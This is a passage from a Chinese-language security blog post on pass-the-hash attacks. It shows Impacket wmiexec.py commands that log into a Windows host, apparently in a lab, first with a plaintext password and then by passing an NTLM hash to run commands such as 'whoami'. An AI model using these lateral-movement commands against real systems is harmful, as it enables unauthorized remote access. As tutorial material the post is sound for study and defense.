+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py admin:Aa123456@192.168.31.160</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/PTH-HASH%E4%BC%A0%E9%80%92/image-20251117230021004.png" alt="image-20251117230021004"></p>
+<p>因为目前大部分情况已经无法通过mimitkaz获取到目标机明文密码，而获取到的密码基本为哈希密码，因此需要利用该脚本通过传递哈希值的方式进行登录。</p>
+<p>目标机的哈希密码：47bf8039a8506cd67c524a03ff84ba4e</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py -hashes 00000000000000000000000000000000:47bf8039a8506cd67c524a03ff84ba4e admin@192.168.31.160		#其中00..00可随意填写</span><br><span class="line">python wmiexec.py -hashes :47bf8039a8506cd67c524a03ff84ba4e admin@192.168.31.160 &quot;whoami&quot;	</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/PTH-HASH%E4%BC%A0%E9%80%92/image-20251117230515154.png" alt="image-20251117230515154"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">主页</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/friends/">友链</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+          <li><a href="/about/">关于我</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Hash%E5%AF%86%E7%A0%81%E7%9A%84%E5%AD%98%E5%82%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.</span> <span class="toc-text">Hash密码的存储方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">2.</span> <span class="toc-text">哈希传递的基本概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PTH-HASH%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB"><span class="toc-number">3.</span> <span class="toc-text">PTH-HASH传递攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mimitkaz-pth"><span class="toc-number">3.1.</span> <span class="toc-text">mimitkaz pth</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Psexec"><span class="toc-number">3.2.</span> <span class="toc-text">Psexec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WMI"><span class="toc-number">3.3.</span> <span class="toc-text">WMI</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#wmi%E4%BB%8B%E7%BB%8D"><span class="toc-number">3.3.1.</span> <span class="toc-text">wmi介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#wmiexec%E5%92%8Cpsexec%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">3.3.2.</span> <span class="toc-text">wmiexec和psexec的区别</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://godrone.github.io/2025/07/18/PTH-HASH%E4%BC%A0%E9%80%92/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://godrone.github.io/2025/07/18/PTH-HASH%E4%BC%A0%E9%80%92/&text=PTH-HASH传递"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://godrone.github.io/2025/07/18/PTH-HASH%E4%BC%A0%E9%80%92/&title=PTH-HASH传递"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godrone.github.io/2025/07/18/PTH-HASH%E4%BC%A0%E9%80%92/&is_video=false&description=PTH-HASH传递"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PTH-HASH传递&body=Check out this article: https://godrone.github.io/2025/07/18/PTH-HASH%E4%BC%A0%E9%80%92/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://godrone.github.io/2025/07/18/PTH-HASH%E4%BC%A0%E9%80%92/&title=PTH-HASH传递"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://godrone.github.io/2025/07/18/PTH-HASH%E4%BC%A0%E9%80%92/&title=PTH-HASH传递"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://godrone.github.io/2025/07/18/PTH-HASH%E4%BC%A0%E9%80%92/&title=PTH-HASH传递"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://godrone.github.io/2025/07/18/PTH-HASH%E4%BC%A0%E9%80%92/&title=PTH-HASH传递"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://godrone.github.io/2025/07/18/PTH-HASH%E4%BC%A0%E9%80%92/&name=PTH-HASH传递&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://godrone.github.io/2025/07/18/PTH-HASH%E4%BC%A0%E9%80%92/&t=PTH-HASH传递"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2019-2026
+    Rone
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">主页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/friends/">友链</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于我</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
